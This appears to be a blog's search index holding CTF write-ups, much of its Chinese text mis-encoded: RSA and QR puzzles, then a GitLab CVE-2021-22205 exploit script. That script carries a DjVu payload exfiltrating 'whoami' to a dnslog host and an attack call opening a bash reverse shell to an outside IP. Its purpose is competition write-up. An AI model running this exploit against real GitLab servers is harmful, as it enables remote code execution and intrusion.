<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>Á¨¨ÂÖ≠Â±äÂº∫ÁΩëÊãüÊÄÅÈò≤Âæ°ÂõΩÈôÖÁ≤æËã±ÊåëÊàòËµõÂàùËµõ</title>
      <link href="/2023/11/13/%E7%AC%AC%E5%85%AD%E5%B1%8A%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81%E9%98%B2%E5%BE%A1%E5%9B%BD%E9%99%85%E7%B2%BE%E8%8B%B1%E6%8C%91%E6%88%98%E8%B5%9B%E5%88%9D%E8%B5%9B/"/>
      <url>/2023/11/13/%E7%AC%AC%E5%85%AD%E5%B1%8A%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81%E9%98%B2%E5%BE%A1%E5%9B%BD%E9%99%85%E7%B2%BE%E8%8B%B1%E6%8C%91%E6%88%98%E8%B5%9B%E5%88%9D%E8%B5%9B/</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"/><p><img src="https://img-blog.csdnimg.cn/629b0fc893fc43df905a434be60d8555.png" alt="1"></p><h3 id="Welcome"><a href="#Welcome" class="headerlink" title="Welcome"></a>Welcome</h3><p>base64Ëß£ÂØÜ</p><h3 id="‰∏ÄÁúºÁúãÂá∫"><a href="#‰∏ÄÁúºÁúãÂá∫" class="headerlink" title="‰∏ÄÁúºÁúãÂá∫"></a>‰∏ÄÁúºÁúãÂá∫</h3><p><strong>Ë¥πÈ©¨ÂÆöÁêÜ</strong></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">from</span> secret <span class="token keyword">import</span> flag<span class="token keyword">import</span> gmpy2flag<span class="token operator">=</span><span class="token string">b''</span>r <span class="token operator">=</span> getPrime<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span>a <span class="token operator">=</span> <span class="token number">11001240791308496565411773845509754352597481464288272699325231395472137144610774645372812149675141360600469640492874223541765389441131365669731006263464699</span>p <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span>next_prime<span class="token punctuation">(</span>a <span class="token operator">-</span> r<span class="token punctuation">)</span>q <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span>next_prime<span class="token punctuation">(</span>gmpy2<span class="token punctuation">.</span>next_prime<span class="token punctuation">(</span>a<span class="token punctuation">)</span> <span class="token operator">+</span> r<span class="token punctuation">)</span>n <span class="token operator">=</span> p<span class="token operator">*</span>q<span class="token keyword">def</span> <span class="token function">enc</span><span class="token punctuation">(</span>flag<span class="token punctuation">,</span> n<span class="token punctuation">)</span><span class="token punctuation">:</span>    m <span class="token operator">=</span> bytes_to_long<span class="token punctuation">(</span>flag<span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>m<span class="token punctuation">,</span> <span class="token number">65537</span><span class="token punctuation">,</span> n<span class="token punctuation">)</span>c <span class="token operator">=</span> enc<span class="token punctuation">(</span>flag<span class="token punctuation">,</span> n<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'n ='</span><span class="token punctuation">,</span> n<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'c ='</span><span class="token punctuation">,</span> c<span class="token punctuation">)</span><span class="token comment"># ('n =', mpz(121027298948349995679677982412648544403333177260975245569073983061538581058440163574922807151182889153495253964764966037308461724272151584478723275142858008261257709817963330011376266261119767294949088397671360123321149414700981035517299807126625758046100840667081332434968770862731073693976604061597575813313L))</span><span class="token comment"># ('c =', mpz(42256117129723577554705402387775886393426604555611637074394963219097781224776058009003521565944180241032100329456702310737369381890041336312084091995865560402681403775751012856436207938771611177592600423563671217656908392901713661029126149486651409531213711103407037959788587839729511719756709763927616470267L))</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>Ê†πÊçÆ‰ª•‰∏ã‰ª£Á†ÅÊ±ÇÂá∫p„ÄÅq</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span>  gmpy2<span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> getPrimer <span class="token operator">=</span> getPrime<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span>a <span class="token operator">=</span> <span class="token number">11001240791308496565411773845509754352597481464288272699325231395472137144610774645372812149675141360600469640492874223541765389441131365669731006263464699</span>p <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span>next_prime<span class="token punctuation">(</span>a <span class="token operator">-</span> r<span class="token punctuation">)</span>q <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span>next_prime<span class="token punctuation">(</span>gmpy2<span class="token punctuation">.</span>next_prime<span class="token punctuation">(</span>a<span class="token punctuation">)</span> <span class="token operator">+</span> r<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>q<span class="token punctuation">)</span><span class="token comment">#p=11001240791308496565411773845509754352597481464288272699325231395472137144610774645372812149675141360600469640492874223541765389441131365669731006263464699</span><span class="token comment">#q=11001240791308496565411773845509754352597481464288272699325231395472137144610774645372812149675141360600469640492874223541765389441131365669731006263465587</span><span class="token comment">#n=121027298948349995679677982412648544403333177260975245569073983061538581058440163574922807151182889153495253964764966037308461724272151584478723275142858008261257709817963330011376266261119767294949088397671360123321149414700981035517299807126625758046100840667081332434968770862731073693976604061597575813313</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>Áõ≤Áåúe&#x3D;65537<br>ÂØÜÊñácÂ∑≤ÁªèÁªôÂá∫</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">c<span class="token operator">=</span><span class="token number">42256117129723577554705402387775886393426604555611637074394963219097781224776058009003521565944180241032100329456702310737369381890041336312084091995865560402681403775751012856436207938771611177592600423563671217656908392901713661029126149486651409531213711103407037959788587839729511719756709763927616470267</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>ÊúÄÁªàËÑöÊú¨:</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> gmpy2e <span class="token operator">=</span> <span class="token number">65537</span>p <span class="token operator">=</span> <span class="token number">11001240791308496565411773845509754352597481464288272699325231395472137144610774645372812149675141360600469640492874223541765389441131365669731006263464699</span>q <span class="token operator">=</span> <span class="token number">11001240791308496565411773845509754352597481464288272699325231395472137144610774645372812149675141360600469640492874223541765389441131365669731006263465587</span>n <span class="token operator">=</span> p <span class="token operator">*</span> q<span class="token comment"># ÂØÜÊñá</span>c <span class="token operator">=</span> <span class="token number">42256117129723577554705402387775886393426604555611637074394963219097781224776058009003521565944180241032100329456702310737369381890041336312084091995865560402681403775751012856436207938771611177592600423563671217656908392901713661029126149486651409531213711103407037959788587839729511719756709763927616470267</span>d <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span>invert<span class="token punctuation">(</span>e<span class="token punctuation">,</span> <span class="token punctuation">(</span>p <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token punctuation">(</span>q <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># Ê±ÇÊòéÊñá</span>M <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>c<span class="token punctuation">,</span> d<span class="token punctuation">,</span> n<span class="token punctuation">)</span>  <span class="token comment"># Âø´ÈÄüÊ±ÇÂπÇÂèñÊ®°ËøêÁÆó</span><span class="token comment"># Convert the plaintext to a string</span>M_str <span class="token operator">=</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>M<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span>  <span class="token comment"># Convert M to hexadecimal and remove the '0x' prefix</span>M_bytes <span class="token operator">=</span> <span class="token builtin">bytes</span><span class="token punctuation">.</span>fromhex<span class="token punctuation">(</span>M_str<span class="token punctuation">)</span>  <span class="token comment"># Convert the hexadecimal string to bytes</span>M_str_final <span class="token operator">=</span> M_bytes<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span>  <span class="token comment"># Decode bytes to UTF-8 string</span><span class="token keyword">print</span><span class="token punctuation">(</span>M_str_final<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ÊàñËÄÖ‰ΩøÁî®rsaËß£ÂØÜÂ∑•ÂÖ∑<br><img src="https://img-blog.csdnimg.cn/ad455aeee45246fbaf257543b70001ad.png" alt="2"></p><h3 id="ÂõΩÈôÖË±°Ê£ã‰∏é‰∫åÁª¥Á†ÅÔºö"><a href="#ÂõΩÈôÖË±°Ê£ã‰∏é‰∫åÁª¥Á†ÅÔºö" class="headerlink" title="ÂõΩÈôÖË±°Ê£ã‰∏é‰∫åÁª¥Á†ÅÔºö"></a>ÂõΩÈôÖË±°Ê£ã‰∏é‰∫åÁª¥Á†ÅÔºö</h3><p><img src="https://img-blog.csdnimg.cn/90005912edcb4bdcb16217985d73a064.png" alt="23"><br>Áî®Ëøô‰∏™ÂõæÁâáË∑üÂéüÂõæÁâá ÂºÇÊàñ<br><img src="https://img-blog.csdnimg.cn/f606096be1794c0aac580ef70f990176.png" alt="5"><br>Êâ´Á†ÅÂ∞±ÊòØflag</p><h3 id="Êñ∞ÂûãËΩ¶ËÅîÁΩëÂÆâÂÖ®ÁΩëÁªúÂçèËÆÆÁ†¥Ëß£ÔºàÈò∂ÊÆµ‰∏ÄÔºâ"><a href="#Êñ∞ÂûãËΩ¶ËÅîÁΩëÂÆâÂÖ®ÁΩëÁªúÂçèËÆÆÁ†¥Ëß£ÔºàÈò∂ÊÆµ‰∏ÄÔºâ" class="headerlink" title="Êñ∞ÂûãËΩ¶ËÅîÁΩëÂÆâÂÖ®ÁΩëÁªúÂçèËÆÆÁ†¥Ëß£ÔºàÈò∂ÊÆµ‰∏ÄÔºâ"></a>Êñ∞ÂûãËΩ¶ËÅîÁΩëÂÆâÂÖ®ÁΩëÁªúÂçèËÆÆÁ†¥Ëß£ÔºàÈò∂ÊÆµ‰∏ÄÔºâ</h3><p>Ëøû‰∏äVPNÂêéËÆøÈóÆÈ°µÈù¢ÂèëÁé∞ÊòØgitlabÔºåÁâàÊú¨13.9ÔºåÊâæÂà∞<a href="https://github.com/Al1ex/CVE-2021-22205">CVE-2021-22205</a><br>‰ΩøÁî®ËÑöÊú¨Áõ¥Êé•ÊâìÔºåÂèØÊòØÊï¥‰∫ÜÂçäÂ§©‰ΩøÁî®ËÑöÊú¨‰∏ÄÁõ¥Êâì‰∏çÈÄöüò∂‚Äçüå´Ô∏èÔºå‰∏éÈù∂Êú∫ËøûÊé•‰∏ç‰∏äÔºåÂÄü‰∏Ä‰∏™ÊîπËøáÁöÑpoc<br>ÂÄüÈâ¥‰∫é<a href="https://mp.weixin.qq.com/s/LyxgB7YFM0RcZSN5hmZF9Q">ËøôÈáå</a>‚¨ÖÔ∏è</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token keyword">import</span> socks<span class="token keyword">from</span> bs4 <span class="token keyword">import</span> BeautifulSouprequests<span class="token punctuation">.</span>packages<span class="token punctuation">.</span>urllib3<span class="token punctuation">.</span>disable_warnings<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">title</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token triple-quoted-string string">"""   ______     _______     ____   ___ ____  _      ____  ____  ____   ___  ____    / ___\ \   / / ____|   |___ \ / _ \___ \/ |    |___ \|___ \|___ \ / _ \| ___|  | |    \ \ / /|  _| _____ __) | | | |__) | |_____ __) | __) | __) | | | |___ \  | |___  \ V / | |__|_____/ __/| |_| / __/| |_____/ __/ / __/ / __/| |_| |___) |  \____ |  \_/  |_____|   |_____|\___/_____|_|    |_____|_____|_____|\___/|____/                                   Author:Al1ex@Heptagram                                Github:https://github.com/Al1ex                              """</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token triple-quoted-string string">'''        È™åËØÅÊ®°ÂºèÔºöpython CVE-2021-22205.py -v true -t target_url         ÊîªÂáªÊ®°ÂºèÔºöpython CVE-2021-22205.py -a true -t target_url -c command         ÊâπÈáèÊ£ÄÊµãÔºöpython CVE-2021-22205.py -s true -f file         '''</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">check</span><span class="token punctuation">(</span>target_url<span class="token punctuation">)</span><span class="token punctuation">:</span>    session <span class="token operator">=</span> requests<span class="token punctuation">.</span>Session<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        req1 <span class="token operator">=</span> session<span class="token punctuation">.</span>get<span class="token punctuation">(</span>target_url<span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token string">"/"</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"/users/sign_in"</span><span class="token punctuation">,</span> verify<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>        soup <span class="token operator">=</span> BeautifulSoup<span class="token punctuation">(</span>req1<span class="token punctuation">.</span>text<span class="token punctuation">,</span> features<span class="token operator">=</span><span class="token string">"lxml"</span><span class="token punctuation">)</span>        token <span class="token operator">=</span> soup<span class="token punctuation">.</span>findAll<span class="token punctuation">(</span><span class="token string">'meta'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">16</span><span class="token punctuation">]</span><span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"content"</span><span class="token punctuation">)</span>        data <span class="token operator">=</span> <span class="token string">"\r\n------WebKitFormBoundaryIMv3mxRg59TkFSX5\r\nContent-Disposition: form-data; name=\"file\"; filename=\"test.jpg\"\r\nContent-Type: image/jpeg\r\n\r\nAT&amp;TFORM\x00\x00\x03\xafDJVMDIRM\x00\x00\x00.\x81\x00\x02\x00\x00\x00F\x00\x00\x00\xac\xff\xff\xde\xbf\x99 !\xc8\x91N\xeb\x0c\x07\x1f\xd2\xda\x88\xe8k\xe6D\x0f,q\x02\xeeI\xd3n\x95\xbd\xa2\xc3\"?FORM\x00\x00\x00^DJVUINFO\x00\x00\x00\n\x00\x08\x00\x08\x18\x00d\x00\x16\x00INCL\x00\x00\x00\x0fshared_anno.iff\x00BG44\x00\x00\x00\x11\x00J\x01\x02\x00\x08\x00\x08\x8a\xe6\xe1\xb17\xd9*\x89\x00BG44\x00\x00\x00\x04\x01\x0f\xf9\x9fBG44\x00\x00\x00\x02\x02\nFORM\x00\x00\x03\x07DJVIANTa\x00\x00\x01P(metadata\n\t(Copyright \"\\\n\" . qx&#123;curl `whoami`.82sm53.dnslog.cn&#125; . \\\n\" b \") )                                                                                                                                                                                                                                                                                                                                                                                                                                     \n\r\n------WebKitFormBoundaryIMv3mxRg59TkFSX5--\r\n\r\n"</span>        headers <span class="token operator">=</span> <span class="token punctuation">&#123;</span>            <span class="token string">"User-Agent"</span><span class="token punctuation">:</span> <span class="token string">"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.0 Safari/537.36"</span><span class="token punctuation">,</span>            <span class="token string">"Connection"</span><span class="token punctuation">:</span> <span class="token string">"close"</span><span class="token punctuation">,</span>            <span class="token string">"Content-Type"</span><span class="token punctuation">:</span> <span class="token string">"multipart/form-data; boundary=----WebKitFormBoundaryIMv3mxRg59TkFSX5"</span><span class="token punctuation">,</span>            <span class="token string">"X-CSRF-Token"</span><span class="token punctuation">:</span> <span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span>token<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">,</span> <span class="token string">"Accept-Encoding"</span><span class="token punctuation">:</span> <span class="token string">"gzip, deflate"</span><span class="token punctuation">&#125;</span>        flag <span class="token operator">=</span> <span class="token string">'Failed to process image'</span>        req2 <span class="token operator">=</span> session<span class="token punctuation">.</span>post<span class="token punctuation">(</span>target_url<span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token string">"/"</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"/uploads/user"</span><span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">,</span> headers<span class="token operator">=</span>headers<span class="token punctuation">,</span> verify<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> flag <span class="token keyword">in</span> req2<span class="token punctuation">.</span>text<span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[+] ÁõÆÊ†á &#123;&#125; Â≠òÂú®ÊºèÊ¥û"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>target_url<span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[-] ÁõÆÊ†á &#123;&#125; ‰∏çÂ≠òÂú®ÊºèÊ¥û"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>target_url<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">attack</span><span class="token punctuation">(</span>target_url<span class="token punctuation">,</span>command<span class="token punctuation">)</span><span class="token punctuation">:</span>    session <span class="token operator">=</span> requests<span class="token punctuation">.</span>Session<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        req1 <span class="token operator">=</span> session<span class="token punctuation">.</span>get<span class="token punctuation">(</span>target_url<span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token string">"/"</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"/users/sign_in"</span><span class="token punctuation">,</span> verify<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>        soup <span class="token operator">=</span> BeautifulSoup<span class="token punctuation">(</span>req1<span class="token punctuation">.</span>text<span class="token punctuation">,</span> features<span class="token operator">=</span><span class="token string">"lxml"</span><span class="token punctuation">)</span>        token <span class="token operator">=</span> soup<span class="token punctuation">.</span>findAll<span class="token punctuation">(</span><span class="token string">'meta'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">16</span><span class="token punctuation">]</span><span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"content"</span><span class="token punctuation">)</span>        data <span class="token operator">=</span> <span class="token string">"\r\n------WebKitFormBoundaryIMv3mxRg59TkFSX5\r\nContent-Disposition: form-data; name=\"file\"; filename=\"test.jpg\"\r\nContent-Type: image/jpeg\r\n\r\nAT&amp;TFORM\x00\x00\x03\xafDJVMDIRM\x00\x00\x00.\x81\x00\x02\x00\x00\x00F\x00\x00\x00\xac\xff\xff\xde\xbf\x99 !\xc8\x91N\xeb\x0c\x07\x1f\xd2\xda\x88\xe8k\xe6D\x0f,q\x02\xeeI\xd3n\x95\xbd\xa2\xc3\"?FORM\x00\x00\x00^DJVUINFO\x00\x00\x00\n\x00\x08\x00\x08\x18\x00d\x00\x16\x00INCL\x00\x00\x00\x0fshared_anno.iff\x00BG44\x00\x00\x00\x11\x00J\x01\x02\x00\x08\x00\x08\x8a\xe6\xe1\xb17\xd9*\x89\x00BG44\x00\x00\x00\x04\x01\x0f\xf9\x9fBG44\x00\x00\x00\x02\x02\nFORM\x00\x00\x03\x07DJVIANTa\x00\x00\x01P(metadata\n\t(Copyright \"\\\n\" . qx&#123;"</span><span class="token operator">+</span>  command <span class="token operator">+</span><span class="token string">"&#125; . \\\n\" b \") )                                                                                                                                                                                                                                                                                                                                                                                                                                     \n\r\n------WebKitFormBoundaryIMv3mxRg59TkFSX5--\r\n\r\n"</span>        headers <span class="token operator">=</span> <span class="token punctuation">&#123;</span>            <span class="token string">"User-Agent"</span><span class="token punctuation">:</span> <span class="token string">"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.0 Safari/537.36"</span><span class="token punctuation">,</span>            <span class="token string">"Connection"</span><span class="token punctuation">:</span> <span class="token string">"close"</span><span class="token punctuation">,</span>            <span class="token string">"Content-Type"</span><span class="token punctuation">:</span> <span class="token string">"multipart/form-data; boundary=----WebKitFormBoundaryIMv3mxRg59TkFSX5"</span><span class="token punctuation">,</span>            <span class="token string">"X-CSRF-Token"</span><span class="token punctuation">:</span> <span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span>token<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">,</span> <span class="token string">"Accept-Encoding"</span><span class="token punctuation">:</span> <span class="token string">"gzip, deflate"</span><span class="token punctuation">&#125;</span>        flag <span class="token operator">=</span> <span class="token string">'Failed to process image'</span>        req2 <span class="token operator">=</span> session<span class="token punctuation">.</span>post<span class="token punctuation">(</span>target_url<span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token string">"/"</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"/uploads/user"</span><span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">,</span> headers<span class="token operator">=</span>headers<span class="token punctuation">,</span> verify<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> flag <span class="token keyword">in</span> req2<span class="token punctuation">.</span>text<span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[+] ÁõÆÊ†á &#123;&#125; Â≠òÂú®ÊºèÊ¥û"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>target_url<span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[+] ËØ∑Âà∞dnslogÊàñ‰∏ªÊú∫Ê£ÄÊü•ÊâßË°åÁªìÊûú"</span><span class="token punctuation">)</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[-] ÁõÆÊ†á &#123;&#125; ‰∏çÂ≠òÂú®ÊºèÊ¥û"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>target_url<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">scan</span><span class="token punctuation">(</span><span class="token builtin">file</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> url_link <span class="token keyword">in</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token builtin">file</span><span class="token punctuation">,</span> <span class="token string">'r'</span><span class="token punctuation">,</span> encoding<span class="token operator">=</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">if</span> url_link<span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token string">''</span><span class="token punctuation">:</span>                url_path <span class="token operator">=</span> format_url<span class="token punctuation">(</span>url_link<span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>                check<span class="token punctuation">(</span>url_path<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">format_url</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> url<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token string">"http"</span><span class="token punctuation">:</span>            url <span class="token operator">=</span> <span class="token string">"https://"</span> <span class="token operator">+</span> url            url <span class="token operator">=</span> url<span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> url    <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'URL ÈîôËØØ &#123;0&#125;'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    attack<span class="token punctuation">(</span><span class="token string">"http://172.18.0.4/"</span><span class="token punctuation">,</span><span class="token string">"bash -c 'bash -i >&amp; /dev/tcp/8.1xx.1xx.xx/6666 0>&amp;1'"</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    title<span class="token punctuation">(</span><span class="token punctuation">)</span>    main<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> Ëµõ‰∫ãWP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Geekgame2023</title>
      <link href="/2023/10/27/Geekgame2023/"/>
      <url>/2023/10/27/Geekgame2023/</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="f4456b45858be695e0b7c5b6965959eb828b19049efaaa85e5ea6751146fef94">87c33ccf373964f94b22f879069d2b54afe0ff15df331af3f0f06021c9d57017e641f12aa19f4dfdd112e2b10d90a6a6e2adacbfe93b76bf3c0710d30b3298b160bb943731b3d3dbe8e38189338551de53cabcdf703c85e2b80405885b1791e528371216c48cb789490aa0268e5f2ab11b2a37eae9ae75b6be56865bfb8cc48dedb3d1fd080d91f7f168cd83995333624a8c2381adaf3de2746fbb616f0ea039ca345f7558cd4d61a0fb14a081266e2b4c9ac4be9fc27f0533fa7a2cb94a469f31603d92c734a28ae76a04fc1da8dca766a0ab618c1c3a78dde43d5bb0058bc07058b2eaf30188e8ab48b67a7b762052e88d792a94de8533f9bdfc01c8d06eaa0fe24b367e172bbd42a5e71b0c7881f7572de6ae4b38b6d50b8db901a79eb98ed6679874b0a44f7aa5808da3390f2377a789f8efbe4ca802112d078e376068d13d6283e25e35fe83d314b01534a08f270e8c3f2f4a939b540e228795bcb6ba431006ac408bde8a52e8891652d39fa7c9b31f2a250f0dbf51cae1881c4b1e8bd6c4032aaf8ce59b8494029cad9992afc0992238f97f40dd1e98e8fd40b0cda6368647914eca355fc32e210719187e37e48bec574cf4c7e5eac1c584b41b026390f42e6e91c904cb09e46cb5bc68c0283d5bf510c57aae18741654cf1eabb5b6aedb9249823b2e7f96341627bc0fb5c276a6dc497fa57a290f563f68f230527d70c103e793b594f94c3a24d5a68abfd5d1ed46462acd29af876581a3f1dd84032b6b60f8651673edcd754f3864409a02e7e9837f6b10e978829448df854c287cf8e4d8a8cf3d4b14270e2d0f2f6dfde8985c069f5feea3bd930fd93f28e4d2501e05b0ea9ac70ec627d0d3278d77c8a56fabddcd69564726d7b97783353edd72d99b285855db99f3100e2e64da888ac92630ca6de85b400428946752184167bbac9f52d59f4e899971dde5a50bb488d516932b11fe01e59389d2e631523a3265cd272e7e53ffe97723694bc7a63b4e83bab784ddb0863cb7e00118fa187ad19b88f47cb4277ab2b19738cb4e6c49b3005a7df0e1e322c5b3fb2c2cceb895e7327d7dfb761f245e0429dfa3cbdfae2524339188cfd279543a37aa1f58c531eeca8f7a8506855f7b6171ab5779f197d3d26c684eee1bb78a3d766120d438bc9f1753d23a3a95c44f519179094951950763c04391d3931b4026d883d3f809f535054b66ac3d097c1f85e146cf65cbddfc9a7bd9b55529dc85c8b943f4423119ce30119ef05a443f239a4b9656a9cbc50dac40625a43308aa87436705b96b7da3c6d3c7d4720144cbf3c31c472f605d1261